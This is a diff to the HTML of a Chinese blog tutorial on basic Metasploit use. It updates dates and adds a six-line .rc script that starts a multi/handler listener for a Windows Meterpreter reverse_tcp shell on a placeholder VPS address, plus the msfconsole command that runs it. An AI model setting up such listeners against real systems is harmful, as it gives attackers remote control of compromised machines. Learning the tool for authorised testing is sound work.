@@ -76,7 +76,7 @@
 
     
         <meta property="article:published_time" content="7月 29, 2017" />
-        <meta property="article:modified_time" content="7月 30, 2017" />
+        <meta property="article:modified_time" content="7月 31, 2017" />
     
 
     <!-- The Twitter Card protocol -->
@@ -117,7 +117,7 @@
     "headline": "Metasploit基础使用",
     "url": "https://ares-x.com/2017/07/29/Metasploit基础使用/index.html",
     "datePublished": "7月 29, 2017",
-    "dateModified": "7月 30, 2017",
+    "dateModified": "7月 31, 2017",
     "description": "There is no description",
     "mainEntityOfPage": {
         "@type": "WebPage",
@@ -564,7 +564,10 @@ https://www.rapid7.com
 <li>查看需要设置的配置参数：show options</li>
 <li>设置配置参数：set XXXX xxxxxx</li>
 <li>开始攻击：exploit</li>
+<li>使用.rc脚本自动化处理<br>如创建<code>listener.rc</code>文件写入<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST &lt;Your Vps&apos;s IP&gt;</div><div class="line">set LPORT &lt;Your Port&gt;</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j-z</div></pre></td></tr></table></figure>
+</li>
 </ul>
+<p>使用时运行<code>msfconsole -r /opt/listner.rc</code>即可自动执行.rc文件内的命令省去频繁操作</p>
 <hr>
 <ul>
 <li>搜索时出现[!] Database not connected or cache not built, using slow search</li>
